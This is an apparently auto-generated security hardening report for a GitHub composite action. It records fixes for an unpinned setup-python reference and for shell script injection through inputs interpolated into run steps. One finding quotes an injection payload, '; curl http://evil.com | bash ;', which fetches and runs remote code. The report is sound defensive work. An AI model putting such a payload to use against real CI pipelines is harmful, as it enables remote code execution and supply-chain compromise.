<!-- markdownlint-disable -->

# Hardening Report: rmeneely--update-yaml/v1

> This file was generated automatically by the hardening agent.

**Policy SHA:** `d636be7e43ef829af6e853da6b3c7566db9f72fe`

**Test Policy SHA:** `843adf9e4b8f85d0c08b27b9d0b09dd094b54702`

**Harden Agent Version:** `1`

Action **rmeneely--update-yaml/v1** was hardened automatically. 6 finding(s) were identified and resolved across 1 iteration(s).

## Findings Fixed

### unpinned-uses (severity: high)

The composite action uses `actions/setup-python@v4`, which is pinned to a mutable version tag rather than an immutable 40-character commit SHA. A tag can be moved to point to a different (potentially malicious) commit, enabling a supply-chain attack. It should be pinned to a full SHA, e.g. `actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065 # v4`.

Locations:

- `action.yml:21`

### script-injection (severity: high)

Sub-rule (a): Multiple `${{ ... }}` expressions are interpolated directly inside `run:` shell command strings, allowing script injection. In the first run step, `${{ inputs.infile }}`, `${{ inputs.varlist }}`, and `${{ github.action_path }}` are embedded directly in the shell command: `python ${{ github.action_path }}/update-yaml.py -i ${{ inputs.infile }} -V "${{ inputs.varlist }}" > ${{ github.action_path }}/.update-yaml.tmp`. An attacker-controlled `inputs.infile` value such as `; curl http://evil.com | bash ;` would be executed as shell code. In the second run step, `${{ inputs.infile }}` and `${{ github.action_path }}` are again interpolated directly: `diff ${{ inputs.infile }} ${{ github.action_path }}/.update-yaml.tmp` and `mv ${{ github.action_path }}/.update-yaml.tmp ${{ inputs.infile }}`. All these expressions must be moved to `env:` variables and then referenced as double-quoted shell variables (e.g., `"$INPUT_INFILE"`).

Locations:

- `action.yml:23`
- `action.yml:25`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.infile }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.varlist }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:28`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.infile }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:30`

### static-inline-injection (severity: high)

shell injection: expression "${{ inputs.infile }}" appears directly in run: block of step ""; move to env: map

Locations:

- `action.yml:30`

## Iteration Notes

### Iteration 1

**Fixes applied:** unpinned-uses, script-injection, static-inline-injection

**Notes:**

Fixed action.yml: (1) Pinned actions/setup-python@v4 to full SHA 7f4fc3e22c37d6ff65e88745f38bd3157c663f7c with # v4 comment. (2) Moved all ${{ inputs.infile }}, ${{ inputs.varlist }}, and ${{ github.action_path }} expressions from both run: blocks into env: maps (ACTION_PATH, INPUT_INFILE, INPUT_VARLIST), then referenced them as double-quoted shell variables in the shell scripts to prevent script injection.

